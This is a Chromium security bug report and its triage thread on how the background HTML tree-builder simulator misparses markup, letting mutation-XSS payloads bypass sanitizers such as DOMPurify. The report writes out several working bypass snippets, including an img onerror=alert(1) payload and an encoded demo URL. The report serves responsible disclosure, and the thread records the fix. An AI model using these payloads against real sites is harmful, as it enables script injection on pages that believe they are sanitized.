# Security: invalid parsing of HTML by tree_builder_simulator leading to mutation XSS

| Field | Value |
|-------|-------|
| **Issue ID** | [40056601](https://issues.chromium.org/issues/40056601) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>HTML>Parser |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | mi...@bentkowski.info |
| **Assignee** | ma...@chromium.org |
| **Created** | 2021-07-20 |
| **Bounty** | $5,000.00 |

## Description

I've recently realized that Chromium source code has two tree builders:

1) html_tree_builder.cc https://chromium.googlesource.com/chromium/src/+/main/third_party/blink/renderer/core/html/parser/html_tree_builder.cc
2) html_tree_builder_simulator.cc https://chromium.googlesource.com/chromium/src/+/main/third_party/blink/renderer/core/html/parser/html_tree_builder_simulator.cc

If I understand things correctly, html_tree_builder_simulator appears to be used in cases when HTML parsing can be done asynchronously, and its main purpose is to handle tokenizer state switches, while the actual DOM tree is still being built by html_tree_builder.

I noticed that html_tree_builder_simulator is used when parsing `srcdoc` attribute of iframes; but it is NOT used by DOMParser().parseFromString. Many HTML sanitizers use the latter, including DOMPurify or Closure.

So when we have the following snippet:

    iframe.srcdoc = DOMPurify.sanitize(dirty);

The HTML is initially parsed with html_tree_builder but then the result is parsed with html_tree_builder_simulator. This means that any discrepancy between these two tree builders might lead to mutation XSS (for some background about mutation XSS, look at: https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/).

html_tree_builder_simulator appears to be very short and simple. Unfortunately, it oversimplifies HTML parsing, and mishandles tokenizer state switching, leading to seemingly "impossible" DOM trees being created.

I've attached a file called "compare-dom-trees.html", where you can input some HTML and compare DOM trees created by DOMParser and iframe srcdoc. I'm also attaching "dompurify-exploit.html", which proves that DOMPurify can be bypassed, when its output is assigned to srcdoc.

Here's the HTML snippet used in the exploit:

    <select><template><style><!--</style><a rel="--></style></template></select><img src onerror=alert(1)>">

Here's how it's (correctly) parsed by the DOMParser:

└─ #document
   └─ html
      ├─ head
      └─ body
         └─ select
            └─ template

Here's how it's (incorectly) parsed by iframe srcdoc:

└─ #document
   └─ html
      ├─ head
      └─ body
         ├─ select
         │  └─ template
         ├─ img src="" onerror="alert(1)"
         └─ #text: ">

(tested on Chrome 91.0.4472.114).

The second DOM tree, has an <img> tag outside of the template that wasn't present in the first DOM tree, leading to XSS. Please note that the XSS doesn't work on other browsers; it is solely an issue of Chrome.

So to summarize the first part of the report: because of discrepancies in tree_builder and tree_builder_simulator, it is possible for the code following this pattern:

     iframe.srcdoc = sanitize(dirty);

to introduce mutation XSS.

Now, I'll describe parsing issues I found with tree_builder_simulator. Possibly, all of them could be used to mutation XSS. I'll explain them with a short snippet of HTML, followed by the DOM tree created by tree_builder, and then tree_builder_simulator, along with a short explanation. In the proofs I will usually use one of two methods to show that HTML is parsed incorrectly:

1) In normal circumstances, it is not possible to have a comment node in <style> (in html namespace), because it is parsed as RAWTEXT. But bugs in tree_builder_simulator makes it possible
2) In normal circumstances, <plaintext> (in html namespace) can only have text node as a child and it's impossible to end it. Bugs in tree_builder_simulator makes it possible to end it.

Issue #1:

<select><select><plaintext></plaintext><div>I'm outside!

DOMParser DOM tree
└─ #document
   └─ html
      ├─ head
      └─ body
         ├─ select
         └─ plaintext
            └─ #text: </plaintext><div>I'm outside!

iframe srcdoc DOM tree
└─ #document
   └─ html
      ├─ head
      └─ body
         ├─ select
         ├─ plaintext
         └─ div
            └─ #text: I'm outside!

tree_builder_simulator is not aware that <select> inside <select> actually closes it. It is aware only of <input>, <keygen> and <textarea>:

https://chromium.googlesource.com/chromium/src/+/main/third_party/blink/renderer/core/html/parser/html_tree_builder_simulator.cc#104

So it assumes that it is still in "in select" insertion mode. But when being in this mode, it doesn't change the tokenizer state into RAWTEXT or PLAINTEXT:

https://chromium.googlesource.com/chromium/src/+/main/third_party/blink/renderer/core/html/parser/html_tree_builder_simulator.cc#193

That's why <plaintext> is parsed incorrectly.


Issue #2: 

<math><math><p><plaintext></plaintext><div>I'm outside!

DOMParser DOM tree
└─ #document
   └─ html
      ├─ head
      └─ body
         ├─ math
         │  └─ math
         ├─ p
         └─ plaintext
            └─ #text: </plaintext><div>I'm outside!

iframe srcdoc DOM tree
└─ #document
   └─ html
      ├─ head
      └─ body
         ├─ math
         │  └─ math
         ├─ p
         ├─ plaintext
         └─ div
            └─ #text: I'm outside!

tree_builder_simulator incorrectly keeps track of namespaces. It builds a stack of namespaces:

https://chromium.googlesource.com/chromium/src/+/main/third_party/blink/renderer/core/html/parser/html_tree_builder_simulator.cc#147

When we have "<math><math>", the MathML namespace is pushed twice. When then "<p>" element is used, that exits foreign content, then only one MathML namespace is pulled from the stack. So tree_builder_simulator assumes that that it is still in MathML (that is, in "foreign content"), while in fact it should be in HTML namespace. Therefore, plaintext is parsed as it was in foreign content in the second DOM tree.

Issue #3:

<math><mi><mglyph><style><a>hello!

DOMParser DOM tree
└─ #document
   └─ html
      ├─ head
      └─ body
         └─ math
            └─ mi
               └─ mglyph
                  └─ style
                     └─ a
                        └─ #text: hello!

iframe srcdoc DOM tree
└─ #document
   └─ html
      ├─ head
      └─ body
         └─ math
            └─ mi
               └─ mglyph
                  └─ style
                     └─ #text: <a>hello!

Even though <mi> is MathML text integration point, <mglyph> and <malignmark> are the only elements created in MathML namespace. It is described in tree construction dispatcher in HTML spec:
https://html.spec.whatwg.org/multipage/parsing.html#tree-construction-dispatcher

tree_constructor_simulator incorrectly parses <style> as in HTML namespace, while it should be parsed in MathML namespace.

Issue #4:

<select><template><style><!--</style><a rel="--></style></template></select><img src onerror=alert(1)>">

DOMParser DOM tree
└─ #document
   └─ html
      ├─ head
      └─ body
         └─ select
            └─ template

iframe srcdoc DOM tree
└─ #document
   └─ html
      ├─ head
      └─ body
         ├─ select
         │  └─ template
         ├─ img src="" onerror="alert(1)"
         └─ #text: ">

Tree builder simulator is completely unaware of "in template" insertion mode. Therefore, when <template> is inside <select> it incorrectly assumes it is "in select", instead of "in template" leading to incorrect parsing of this snippet.

## Attachments

- [compare-dom-trees.html](attachments/compare-dom-trees.html) (text/plain, 2.9 KB)
- [dompurify-exploit.html](attachments/dompurify-exploit.html) (text/plain, 363 B)
- [dompurify-serverside.js](attachments/dompurify-serverside.js) (text/plain, 650 B)

## Timeline

### [Deleted User] (2021-07-20)

[Empty comment from Monorail migration]

### do...@chromium.org (2021-07-21)

+Blink HTML parser owners for their thoughts here.

[Monorail components: Blink>HTML>Parser]

### ma...@chromium.org (2021-07-21)

Ugh, TreeBuilderSimulator. I've always thought that was a bad idea, and this proves it. Thanks for the detailed description of the potential security issues here.

Thankfully (depending on timing), it should only be used when the BackgroundHTMLParser is active, and not when the new ForceSynchronousHTMLParsing feature is enabled. I.e. if you run with this flag, none of these XSS exploits should work. Would you mind please verifying that?

  --enable-blink-features=ForceSynchronousHTMLParsing

We're actively working to ship this feature very soon, and I'd prefer to just prioritize that over trying to re-architect the old parser to remove the tree builder simulator.

+richard.townsend@, FYI. More pressure to ship soon.



### mi...@bentkowski.info (2021-07-21)

Yes, I confirm that the flag "ForceSynchronousHTMLParsing" fixes the issue.



### ma...@chromium.org (2021-07-21)

Thank you for https://crbug.com/chromium/1231037#c4, I appreciate it. Have you published this exploit anywhere? (Hopefully not yet.)

Now we just need to decide whether this bug needs something to be done more urgently than trying to ship the new mode.


### mi...@bentkowski.info (2021-07-21)

No, I haven't published it.

I think that the thing that maybe increases the urgency a little bit is that html sanitizers (like DOMPurify in the example) might get hit by this behavior but maintainers of sanitizers cannot really do much to prevent this issue from happening.

### do...@chromium.org (2021-07-22)

Thanks for the discussion. Universal XSS is generally a High severity security bug, but it's unclear to me how easy this is to exploit (and e.g. be used to circumvent the same origin policy). We generally want fixes for high severity bugs to be shipped to all users within 60 days[1].

Reporter and/or Mason: are you able to clarify how the XSS here may be used?


1. https://chromium.googlesource.com/chromium/src/+/refs/heads/main/docs/security/severity-guidelines.md

### [Deleted User] (2021-07-22)

[Empty comment from Monorail migration]

### mi...@bentkowski.info (2021-07-22)

I didn't report this bug as a "universal XSS" but as a "mutation XSS" although after some thinking I don't think it's a right depiction of this vulnerability either.

I would say that the core of the issue is that: BackgroundHTMLParser may parse HTML incorrectly, leading to XSS on pages that have a correct prevention against XSS.

In the original report I mentioned this can be abused via `srcdoc` but I realized that this is also the case for server-side generated HTML.

I've created a simple example (that is also attached to this post) that runs DOMPurify server-side. DOMPurify emits a sanitized HTML it deems safe. However, after visiting the page in Chrome, the XSS executes because of incorrect HTML parsing. You can verify that online:

https://dompurify.securitymb1.repl.co/?xss=aasd%3Cmath%3E%3Cmi%3E%3Cmglyph%3E%3Cmi%3E%3C/mglyph%3E%3Cstyle%3E%3C!--aaa%3C/style%3E%3Ca%20rel=%22--%3E%3C/style%3E%3Cimg%20src%20onerror=alert(1)%3E%22%3E

Chrome without "ForceSynchronousHTMLParsing" flag is the only browser in which the example above will fire an alert.

### mi...@bentkowski.info (2021-07-22)

BTW. Could you please CC Mario Heiderich <mario@cure53.de> to this ticket? He's a maintainer of DOMPurify and the library is affected by this bug, so he wants to know how fast things go.

### do...@chromium.org (2021-07-22)

#9: thanks for the clarification. Is it accurate to say that this boils down to a site which believes it may have protected itself against XSS being unintentionally exposed to an XSS attack when run in Chrome? That is, an attacker could perform an XSS against a site which otherwise thinks it has correctly protected against XSS?

### mi...@bentkowski.info (2021-07-22)

#10: That’s correct. 

### [Deleted User] (2021-07-22)

Setting milestone and target because of high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### do...@chromium.org (2021-07-22)

+cc adetaylor for thoughts on severity. Given #11 and #12, I suspect this isn't High severity, but rather Medium or Low. Sites can be vulnerable to XSS without Chrome being able to do anything, but I'm not sure how a site that thinks it's protected itself against XSS but being accidentally vulnerable in Chrome should be thought of (since the incoming HTML has to be a certain shape to fall into here).

### ma...@chromium.org (2021-07-23)

+mario@cure53.de, FYI, as requested.

Also, the "fix" to this bug will end up being the removal of the tree builder simulator. An alternative would be to attempt to patch up all of the individual issues laid out in https://crbug.com/chromium/1231037#c0, but inevitably there will be more. The simulator is, by definition, a light-weight approximation to the actual tree builder. Until simulator === builder, there will be differences like this that can likely be exploited. So it would seem that the right course of action is to remove the simulator completely, and the ForceSynchronousHTMLParsing feature is exactly that project. We are working very hard to get that launched, and this bug likely helps push it over the line, as it will (now) fix several known XSS bypass issues. But I'm not sure there's much else we should be doing to specifically mitigate this bug. Suggestions appreciated!

### ma...@chromium.org (2021-07-23)

[Empty comment from Monorail migration]

### ad...@chromium.org (2021-07-23)

Re https://crbug.com/chromium/1231037#c14 I agree this is medium or low. It doesn't really fit into our existing severity buckets too closely - I think we should err on the side of Medium.

### [Deleted User] (2021-08-05)

[Empty comment from Monorail migration]

### [Deleted User] (2021-08-06)

[Empty comment from Monorail migration]

### [Deleted User] (2021-08-06)

[Empty comment from Monorail migration]

### [Deleted User] (2021-08-06)

[Empty comment from Monorail migration]

### [Deleted User] (2021-08-07)

masonf: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ma...@chromium.org (2021-08-09)

So plan of record here is to ship the Synchronous HTML Parsing feature, tracked in crbug.com/901056. I don't have a timeline for that, but the hope is to ship it this calendar year. I would appreciate it if you could refrain from publishing this exploit until we can ship the feature. Thanks!

### [Deleted User] (2021-08-16)

[Empty comment from Monorail migration]

### [Deleted User] (2021-09-11)

[Empty comment from Monorail migration]

### [Deleted User] (2021-09-22)

[Empty comment from Monorail migration]

### [Deleted User] (2021-10-25)

This issue hasn't been updated in the last 30 days - please update it or consider lowering its priority.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ma...@chromium.org (2021-10-25)

https://crbug.com/chromium/1231037#c23 still applies.

### [Deleted User] (2021-11-15)

[Empty comment from Monorail migration]

### ma...@chromium.org (2021-12-06)

Quick update to https://crbug.com/chromium/1231037#c23 - the ForceSynchronousHTMLParsing feature is currently being enabled via Finch in M96. Assuming no problems there, we should be able to close this as Fixed soon.

### gi...@appspot.gserviceaccount.com (2021-12-15)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/c11809b8c0b9fe16955456110c9ec3723b5ff7b5

commit c11809b8c0b9fe16955456110c9ec3723b5ff7b5
Author: Mason Freed <masonf@chromium.org>
Date: Wed Dec 15 01:51:28 2021

Enable ForceSynchronousHTMLParsing by default

This feature is enabled at 100% (with 1% stable holdback) on all
channels since M96. No unresolved problems have been reported,
and overall metrics are improved [1]. This CL enables the
ForceSynchronousHTMLParsing feature by default, and removes the
LoaderDataPipeTuning feature entirely, replacing it with newly-
hard-coded values from the launched experiment.

[1] https://docs.google.com/document/d/13GewLNZ50nqs0OI7-rzofOXtjuAlD0R4PMLTUsr73dg/edit#heading=h.ctbltu75kgzp

This part is cool:
Fixed: 901056
Fixed: 461877
Fixed: 761992
Fixed: 789124
Fixed: 995660
Fixed: 1038534
Fixed: 1041006
Fixed: 1128608
Fixed: 1130290
Fixed: 1149988
Fixed: 1231037
-> That's 85 stars worth of bugs, as of 12-13-21.

Not sure this is "fixed" by this CL, but it should at least address
https://crbug.com/chromium/1231037#c3:
Bug: 1087177

Change-Id: Icbf01ef6665362ae23f28657e5574ca705b82717
Cq-Do-Not-Cancel-Tryjobs: true
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2798812
Reviewed-by: Nate Chapin <japhet@chromium.org>
Reviewed-by: John Abd-El-Malek <jam@chromium.org>
Reviewed-by: Kentaro Hara <haraken@chromium.org>
Reviewed-by: Yutaka Hirano <yhirano@chromium.org>
Commit-Queue: Mason Freed <masonf@chromium.org>
Cr-Commit-Position: refs/heads/main@{#951773}

[delete] https://crrev.com/707a8f6264c1e38fb5cfaa0d4f0e9f51e72075d9/third_party/blink/web_tests/platform/fuchsia/external/wpt/html/semantics/interactive-elements/the-details-element/toggleEvent-expected.txt
[modify] https://crrev.com/c11809b8c0b9fe16955456110c9ec3723b5ff7b5/third_party/blink/common/features.cc
[modify] https://crrev.com/c11809b8c0b9fe16955456110c9ec3723b5ff7b5/third_party/blink/renderer/platform/loader/fetch/response_body_loader_test.cc
[modify] https://crrev.com/c11809b8c0b9fe16955456110c9ec3723b5ff7b5/services/network/public/cpp/features.cc


### [Deleted User] (2021-12-16)

[Empty comment from Monorail migration]

### [Deleted User] (2021-12-16)

[Empty comment from Monorail migration]

### am...@google.com (2022-02-17)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2022-02-17)

Congratulations! The VRP Panel has decided to award you $5000 for this report. Thank you for this very detailed report and your patience while we resolved this issue. 

### am...@google.com (2022-02-18)

[Empty comment from Monorail migration]

### mi...@bentkowski.info (2022-02-22)

Thanks! I genuinely didn’t expect any bounty for that. 

### am...@chromium.org (2022-02-28)

[Empty comment from Monorail migration]

### am...@google.com (2022-03-01)

[Empty comment from Monorail migration]

### [Deleted User] (2022-03-23)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### am...@google.com (2022-07-21)

[Empty comment from Monorail migration]

### am...@chromium.org (2022-07-21)

[Empty comment from Monorail migration]

### pg...@google.com (2023-01-02)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1231037?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail blocked-on: crbug.com/chromium/901056]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40056601)*
